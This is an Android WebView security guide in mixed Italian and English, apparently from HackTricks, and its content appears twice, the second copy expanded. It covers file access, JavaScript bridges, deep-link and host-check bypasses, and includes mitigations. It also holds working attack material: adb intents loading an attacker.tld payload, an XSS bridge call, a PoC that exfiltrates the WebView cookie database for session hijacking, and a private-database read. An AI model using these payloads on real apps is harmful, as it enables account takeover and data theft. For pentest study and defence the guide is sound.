# Webview Attacks

{{#include ../../banners/hacktricks-training.md}}

## Guida alle configurazioni e alla sicurezza di WebView

### Panoramica delle vulnerabilità di WebView

Un aspetto critico dello sviluppo Android riguarda la corretta gestione delle WebView. Questa guida mette in evidenza le configurazioni chiave e le pratiche di sicurezza per mitigare i rischi associati all'uso delle WebView.

![WebView Example](<../../images/image (1190).png>)

### **Accesso ai file nelle WebView**

Per impostazione predefinita, le WebView consentono l'accesso ai file. Questa funzionalità è controllata dal metodo `setAllowFileAccess()`, disponibile da Android API level 3 (Cupcake 1.5). Le applicazioni con il permesso **android.permission.READ_EXTERNAL_STORAGE** possono leggere file dallo storage esterno utilizzando lo schema URL file (`file://path/to/file`).

#### **Funzionalità deprecate: Universal and File Access From URLs**

- **Universal Access From File URLs**: Questa funzionalità deprecata permetteva richieste cross-origin da file URLs, creando un rischio di sicurezza significativo a causa di potenziali XSS. L'impostazione predefinita è disabilitata (`false`) per le app che targetizzano Android Jelly Bean e versioni successive.
- Per controllare questa impostazione, usare `getAllowUniversalAccessFromFileURLs()`.
- Per modificare questa impostazione, usare `setAllowUniversalAccessFromFileURLs(boolean)`.
- **File Access From File URLs**: Anche questa funzionalità deprecata controllava l'accesso ai contenuti da altri URL con schema file. Come la funzionalità precedente, il valore predefinito è disabilitato per una maggiore sicurezza.
- Usare `getAllowFileAccessFromFileURLs()` per verificare e `setAllowFileAccessFromFileURLs(boolean)` per impostare.

#### **Caricamento sicuro dei file**

Per disabilitare l'accesso al file system pur continuando ad accedere ad assets e risorse, si utilizza il metodo `setAllowFileAccess()`. Con Android R e versioni successive, il valore predefinito è `false`.

- Verificare con `getAllowFileAccess()`.
- Abilitare o disabilitare con `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

La classe **WebViewAssetLoader** è l'approccio moderno per il caricamento di file locali. Usa URL http(s) per accedere ad assets e risorse locali, allineandosi alla Same-Origin policy e facilitando quindi la gestione del CORS.

### loadUrl

Questa è una funzione comune usata per caricare URL arbitrari in una WebView:
```java
webview.loadUrl("<url here>")
```
Ovviamente, un potenziale attaccante non dovrebbe mai poter **controllare la URL** che un'applicazione sta per caricare.

### **Gestione di JavaScript e Intent Scheme**

- **JavaScript**: Disabilitato per default in WebViews, può essere abilitato tramite `setJavaScriptEnabled()`. È necessaria cautela poiché abilitare JavaScript senza adeguate protezioni può introdurre vulnerabilità di sicurezza.
- **Intent Scheme**: WebViews possono gestire lo schema `intent`, il che può portare a exploit se non gestito attentamente. Un esempio di vulnerabilità coinvolgeva un parametro esposto di WebView "support_url" che poteva essere sfruttato per eseguire attacchi di cross-site scripting (XSS).

![Vulnerable WebView](<../../images/image (1191).png>)

Esempio di sfruttamento usando adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Android fornisce una funzionalità che permette a **JavaScript** in una WebView di invocare **funzioni native dell'app Android**. Questo viene realizzato utilizzando il metodo `addJavascriptInterface`, che integra JavaScript con funzionalità native di Android, definito come un _WebView JavaScript bridge_. È necessario prestare attenzione poiché questo metodo consente a tutte le pagine all'interno della WebView di accedere all'oggetto JavaScript Interface registrato, comportando un rischio per la sicurezza se informazioni sensibili vengono esposte tramite queste interfacce.

- **È richiesta massima cautela** per le app che targettizzano versioni di Android precedenti alla 4.2 a causa di una vulnerabilità che permette l'esecuzione remota di codice tramite JavaScript malevolo, sfruttando la reflection.

#### Implementing a JavaScript Bridge

- **JavaScript interfaces** possono interagire con codice nativo, come mostrano gli esempi in cui un metodo di classe viene esposto a JavaScript:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge viene abilitato aggiungendo un'interfaccia al WebView:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- Potenziale sfruttamento tramite JavaScript, ad esempio tramite un attacco XSS, consente la chiamata di metodi Java esposti:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Per mitigare i rischi, **restrict JavaScript bridge usage** al codice fornito con l'APK e impedire il caricamento di JavaScript da fonti remote. Per dispositivi più vecchi, impostare il minimum API level a 17.

### Reflection-based Remote Code Execution (RCE)

- Un metodo documentato permette di ottenere RCE tramite reflection eseguendo uno specifico payload. Tuttavia, l'annotazione `@JavascriptInterface` impedisce l'accesso non autorizzato ai metodi, limitando la superficie di attacco.

### Remote Debugging

- **Remote debugging** è possibile con **Chrome Developer Tools**, permettendo l'interazione e l'esecuzione arbitraria di JavaScript all'interno del contenuto del WebView.

#### Enabling Remote Debugging

- Remote debugging può essere abilitato per tutte le WebViews all'interno di un'applicazione mediante:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Per abilitare condizionatamente il debugging in base allo stato debuggable dell'applicazione:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrate file arbitrari

- Dimostra l'exfiltration di file arbitrari usando un XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
# Webview Attacks



## Guide on WebView Configurations and Security

### Overview of WebView Vulnerabilities

Un aspetto critico dello sviluppo Android riguarda la corretta gestione delle WebView. Questa guida evidenzia le configurazioni chiave e le pratiche di sicurezza per mitigare i rischi associati all'uso delle WebView.

![WebView Example](<../../images/image (1190).png>)

### **File Access in WebViews**

Per impostazione predefinita, le WebView consentono l'accesso ai file. Questa funzionalità è controllata dal metodo `setAllowFileAccess()`, disponibile da Android API level 3 (Cupcake 1.5). Le applicazioni con l'autorizzazione **android.permission.READ_EXTERNAL_STORAGE** possono leggere file dalla memoria esterna usando lo schema URL file (`file://path/to/file`).

#### **Deprecated Features: Universal and File Access From URLs**

- **Universal Access From File URLs**: Questa funzionalità deprecata permetteva richieste cross-origin da file URL, rappresentando un rischio di sicurezza significativo a causa dei potenziali attacchi XSS. L'impostazione predefinita è disabilitata (`false`) per le app rivolte a Android Jelly Bean e versioni successive.
- Per verificare questa impostazione, usare `getAllowUniversalAccessFromFileURLs()`.
- Per modificare questa impostazione, usare `setAllowUniversalAccessFromFileURLs(boolean)`.
- **File Access From File URLs**: Anche questa funzionalità, deprecata, controllava l'accesso a contenuti provenienti da altri URL con schema file. Come per l'accesso universale, il valore predefinito è disabilitato per maggiore sicurezza.
- Usare `getAllowFileAccessFromFileURLs()` per verificare e `setAllowFileAccessFromFileURLs(boolean)` per impostare.

#### **Secure File Loading**

Per disabilitare l'accesso al file system pur continuando ad accedere ad asset e risorse, si usa il metodo `setAllowFileAccess()`. Con Android R e versioni successive, l'impostazione predefinita è `false`.

- Verificare con `getAllowFileAccess()`.
- Abilitare o disabilitare con `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

La classe **WebViewAssetLoader** è l'approccio moderno per il caricamento di file locali. Utilizza URL http(s) per accedere ad asset e risorse locali, allineandosi con la Same-Origin policy e facilitando la gestione di CORS.

### loadUrl

Questa è una funzione comune usata per caricare URL arbitrari in una WebView:
```java
webview.loadUrl("<url here>")
```
Ovviamente, un potenziale attacker non dovrebbe mai poter **controllare l'URL** che un'applicazione sta per caricare.

### Deep-linking into internal WebView (custom scheme → WebView sink)

Molte app registrano custom schemes/paths che instradano un URL fornito dall'utente in una WebView interna all'app. Se il deep link è exported (VIEW + BROWSABLE), un attacker può forzare l'app a renderizzare contenuti remoti arbitrari all'interno del suo contesto WebView.

Schema tipico del manifest (semplificato):
```xml
<activity android:name=".MainActivity" android:exported="true">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<category android:name="android.intent.category.BROWSABLE" />
<data android:scheme="myscheme" android:host="com.example.app" />
</intent-filter>
</activity>
```
Flusso di codice comune (semplificato):
```java
// Entry activity
@Override
protected void onNewIntent(Intent intent) {
Uri deeplink = intent.getData();
String url = deeplink.getQueryParameter("url"); // attacker-controlled
if (deeplink.getPathSegments().get(0).equals("web")) {
Intent i = new Intent(this, WebActivity.class);
i.putExtra("url", url);
startActivity(i);
}
}

// WebActivity sink
webView.loadUrl(getIntent().getStringExtra("url"));
```
Schema d'attacco e PoC via adb:
```bash
# Template – force load in internal WebView
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# If a specific Activity must be targeted
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impatto: la pagina remota viene eseguita nel contesto del WebView dell'app (cookies/session del profilo WebView dell'app, accesso a qualsiasi esposto @JavascriptInterface, potenziale accesso a content:// e file:// a seconda delle impostazioni).

Hunting tips:
- Usa grep sulle sorgenti decompilate per `getQueryParameter("url")`, `loadUrl(`, WebView sinks, e gestori di deep-link (`onCreate/onNewIntent`).
- Controlla il manifest per filtri VIEW+BROWSABLE e schemi/host personalizzati che mappano ad activities che poi avviano un WebView.
- Verifica se ci sono più percorsi di deep-link (es., un percorso “external browser” vs. un percorso “internal webview”) e preferisci quello che effettua il rendering all'interno dell'app.

### Abilitare JavaScript prima della verifica (order-of-checks bug)

Un errore di hardening frequente è abilitare JavaScript o configurare impostazioni rilassate del WebView prima che la allowlist/verifica finale dell'URL di destinazione sia completata. Se la verifica è incoerente tra helper o avviene troppo tardi, un deep link malevolo può raggiungere uno stato in cui:

1) Le impostazioni del WebView si applicano (es., `setJavaScriptEnabled(true)`), e
2) L'URL non attendibile viene caricato con JavaScript abilitato.

Bug pattern (pseudocode):
```java
// 1) Parse/early checks
Uri u = parse(intent);
if (!looksValid(u)) return;

// 2) Configure WebView BEFORE final checks
webView.getSettings().setJavaScriptEnabled(true); // BAD: too early
configureMixedContent();

// 3) Do final verification (late)
if (!finalAllowlist(u)) return; // too late – JS already enabled

// 4) Load
webView.loadUrl(u.toString());
```
Why it’s exploitable
- Normalizzazione incoerente: gli helper split/rebuild l'URL in modo diverso rispetto al controllo finale, creando discrepanze che un URL malevolo può sfruttare.
- Pipeline in ordine errato: abilitare JS nel passo 2 si applica globalmente all'istanza WebView, influenzando il caricamento finale anche se la verifica fallisse successivamente.

How to test
- Crea deep-link payloads che superino i controlli iniziali e raggiungano il sito di configurazione del WebView.
- Usa adb per inviare intent VIEW impliciti che consegnino un parametro `url=` controllato da te:
```bash
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Se l'exploit ha successo, il tuo payload esegue JavaScript nel WebView dell'app. Da lì, cerca bridge esposti:
```html
<script>
for (let k in window) {
try { if (typeof window[k] === 'object' || typeof window[k] === 'function') console.log('[JSI]', k); } catch(e){}
}
</script>
```
Defensive guidance
- Canonicalizza una sola volta; valida rigorosamente contro una singola fonte di verità (scheme/host/path/query).
- Invoca `setJavaScriptEnabled(true)` solo dopo che tutti i controlli allowlist sono passati e immediatamente prima di caricare contenuto affidabile.
- Evita di esporre `@JavascriptInterface` ad origini non affidabili; preferisci un controllo per origine.
- Considera istanze per-WebView separate per contenuto affidabile vs non affidabile, con JS disabilitato di default.

### **JavaScript and Intent Scheme Handling**

- **JavaScript**: Disabilitato di default nelle WebViews, può essere abilitato tramite `setJavaScriptEnabled()`. È necessaria cautela: abilitare JavaScript senza adeguate misure di sicurezza può introdurre vulnerabilità.
- **Intent Scheme**: Le WebViews possono gestire lo scheme `intent`, il che può portare a exploit se non gestito con attenzione. Un esempio di vulnerabilità coinvolgeva un parametro esposto della WebView "support_url" che poteva essere sfruttato per eseguire attacchi di cross-site scripting (XSS).

![WebView vulnerabile](<../../images/image (1191).png>)

Esempio di sfruttamento usando adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Una funzionalità fornita da Android permette a **JavaScript** in una WebView di invocare **funzioni native dell'app Android**. Questo viene ottenuto utilizzando il metodo `addJavascriptInterface`, che integra JavaScript con le funzionalità native di Android, denominato _WebView JavaScript bridge_. È necessario prestare attenzione poiché questo metodo consente a tutte le pagine nella WebView di accedere all'oggetto JavaScript Interface registrato, comportando un rischio di sicurezza se informazioni sensibili vengono esposte tramite queste interfacce.

- **È richiesta estrema cautela** per le app rivolte a versioni di Android inferiori alla 4.2 a causa di una vulnerabilità che consente l'esecuzione remota di codice tramite JavaScript malevolo, sfruttando reflection.

#### Implementazione di un JavaScript Bridge

- Le **interfacce JavaScript** possono interagire con il codice nativo, come mostrano gli esempi in cui un metodo di una classe viene esposto a JavaScript:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge viene abilitato aggiungendo un'interfaccia al WebView:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- Potenziale sfruttamento tramite JavaScript, ad esempio tramite un attacco XSS, consente la chiamata di metodi Java esposti:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Per mitigare i rischi, **restrict JavaScript bridge usage** al codice fornito con l'APK ed evitare il caricamento di JavaScript da fonti remote. Per dispositivi più vecchi, impostare il minimum API level a 17.

#### Abuso dei dispatcher-style JS bridges (invokeMethod/handlerName)

Un pattern comune è un singolo metodo esportato (es., `@JavascriptInterface void invokeMethod(String json)`) che deserializza attacker-controlled JSON in un oggetto generico e dispatches basandosi su un handler name fornito. Tipica struttura JSON:
```json
{
"handlerName": "toBase64",
"callbackId": "cb_12345",
"asyncExecute": "true",
"data": { /* handler-specific fields */ }
}
```
Rischio: se un handler registrato esegue azioni privilegiate sui dati dell'attacker (es., letture dirette di file), puoi richiamarlo impostando `handlerName` di conseguenza. I risultati vengono solitamente inviati di nuovo nel contesto della pagina tramite `evaluateJavascript` e un meccanismo callback/promise indicizzato da `callbackId`.

Key hunting steps
- Decompila e fai grep per `addJavascriptInterface(` per scoprire il nome dell'oggetto bridge (es., `xbridge`).
- In Chrome DevTools (chrome://inspect), digita il nome dell'oggetto bridge nella Console (es., `xbridge`) per enumerare i campi/metodi esposti; cerca un dispatcher generico come `invokeMethod`.
- Enumera i handler cercando classi che implementano `getModuleName()` o mappe di registrazione.

#### Lettura arbitraria di file via URI → File sinks (esfiltrazione Base64)

Se un handler prende una URI, chiama `Uri.parse(req.getUri()).getPath()`, costruisce `new File(...)` e la legge senza allowlists o controlli sandbox, ottieni una lettura arbitraria di file nel sandbox dell'app che bypassa impostazioni di WebView come `setAllowFileAccess(false)` (la lettura avviene in codice nativo, non tramite lo stack di rete della WebView).

PoC per esfiltrare il Chromium WebView cookie DB (session hijack):
```javascript
// Minimal callback sink so native can deliver the response
window.WebViewJavascriptBridge = {
_handleMessageFromObjC: function (data) { console.log(data) }
};

const payload = JSON.stringify({
handlerName: 'toBase64',
callbackId: 'cb_' + Date.now(),
data: { uri: 'file:///data/data/<pkg>/app_webview/Default/Cookies' }
});

xbridge.invokeMethod(payload);
```
Note
- I percorsi del DB dei Cookie variano tra dispositivi/provider. I più comuni:
- `file:///data/data/<pkg>/app_webview/Default/Cookies`
- `file:///data/data/<pkg>/app_webview_<pkg>/Default/Cookies`
- Il handler restituisce Base64; decodificarlo per recuperare i cookie e impersonare l'utente nel profilo WebView dell'app.

Suggerimenti per il rilevamento
- Attenzione a lunghe stringhe Base64 restituite via `evaluateJavascript` quando si usa l'app.
- Eseguire grep sui sorgenti decompilati per handler che accettano `uri`/`path` e li convertono in `new File(...)`.

#### Bypass dei privilegi WebView – controlli host endsWith()

Le decisioni sui privilegi (selezione di una JSB-enabled Activity) spesso si basano su host allowlists. Un pattern errato è:
```java
String host = Uri.parse(url).getHost();
boolean z = true;
if (!host.endsWith(".trusted.com")) {
if (!".trusted.com".endsWith(host)) {
z = false;
}
}
// z==true → open privileged WebView
```
Logica equivalente (di De Morgan):
```java
boolean z = host.endsWith(".trusted.com") ||
".trusted.com".endsWith(host);
```
Questo non è un origin check. Molti host non previsti soddisfano la seconda clausola, permettendo a domini non attendibili di entrare nell'Activity privilegiata. Verificare sempre scheme e host rispetto a una allowlist rigorosa (corrispondenza esatta o un controllo corretto dei sottodomini che rispetti i confini delimitati dal punto), non usare trucchi con `endsWith`.

#### javascript:// primitive di esecuzione via loadUrl

Una volta all'interno di una WebView privilegiata, le app a volte eseguono JS inline tramite:
```java
webView.loadUrl("javascript:" + jsPayload);
```
Se un flusso interno attiva `loadUrl("javascript:...")` in quel contesto, il JS iniettato viene eseguito con accesso al bridge anche se la pagina esterna normalmente non sarebbe autorizzata. Pentest steps:
- Grep for `loadUrl("javascript:` and `evaluateJavascript(` in the app.
- Prova a raggiungere quei percorsi di codice dopo aver forzato la navigazione verso la WebView privilegiata (es., via un permissive deep link chooser).
- Usa la primitive per chiamare il dispatcher (`xbridge.invokeMethod(...)`) e raggiungere sensitive handlers.

Mitigations (developer checklist)
- Strict origin verification for privileged Activities: canonicalize and compare scheme/host against an explicit allowlist; avoid `endsWith`-based checks. Consider Digital Asset Links when applicable.
- Scope bridges to trusted pages only and re-check trust on every call (per-call authorization).
- Rimuovi o proteggi strettamente gli handler che possono accedere al filesystem; preferisci `content://` con allowlists/permissions rispetto ai percorsi grezzi `file://`.
- Evita `loadUrl("javascript:")` in contesti privilegiati oppure mettilo dietro controlli rigorosi.
- Ricorda che `setAllowFileAccess(false)` non protegge dalle letture native di file tramite il bridge.

#### JSB enumeration and debugging tips

- Enable WebView remote debugging to use Chrome DevTools Console:
- Lato app (debug builds): `WebView.setWebContentsDebuggingEnabled(true)`
- System-side: modules like [LSPosed](https://github.com/LSPosed/LSPosed) or Frida scripts can force-enable debugging even in release builds. Example Frida snippet for Cordova WebViews: [cordova enable webview debugging](http://codeshare.frida.re/@gameFace22/cordova---enable-webview-debugging/)
- In DevTools, type the bridge object name (e.g., `xbridge`) to see exposed members and probe the dispatcher.


### Reflection-based Remote Code Execution (RCE)

- A documented method allows achieving RCE through reflection by executing a specific payload. However, the `@JavascriptInterface` annotation prevents unauthorized method access, limiting the attack surface.

### Remote Debugging

- **Remote debugging** is possible with **Chrome Developer Tools**, enabling interaction and arbitrary JavaScript execution within the WebView content.

#### Enabling Remote Debugging

- Il remote debugging può essere abilitato per tutte le WebView all'interno di un'applicazione tramite:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Per abilitare condizionalmente il debugging in base allo stato debuggable dell'applicazione:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrate arbitrary files

- Dimostra l'exfiltration of arbitrary files usando un XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
## Riferimenti

- [Revisione dei vettori di attacco per l'accesso ai file di Android WebViews](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
- [WheresMyBrowser.Android (app demo)](https://github.com/authenticationfailure/WheresMyBrowser.Android)
- [Riferimento Android WebView](https://developer.android.com/reference/android/webkit/WebView)
- [Deep Links & WebViews Exploitations – Parte II](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
- [Deep Links & WebViews Exploitations – Parte I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 catena di attacco (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Video dimostrativo](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Account takeover in Android app via JSB – tuxplorer.com](https://tuxplorer.com/posts/account-takeover-via-jsb/)
- [LSPosed – systemless Xposed framework](https://github.com/LSPosed/LSPosed)
- [Frida codeshare: Cordova – abilitare il debugging di WebView](http://codeshare.frida.re/@gameFace22/cordova---enable-webview-debugging/)

{{#include ../../banners/hacktricks-training.md}}
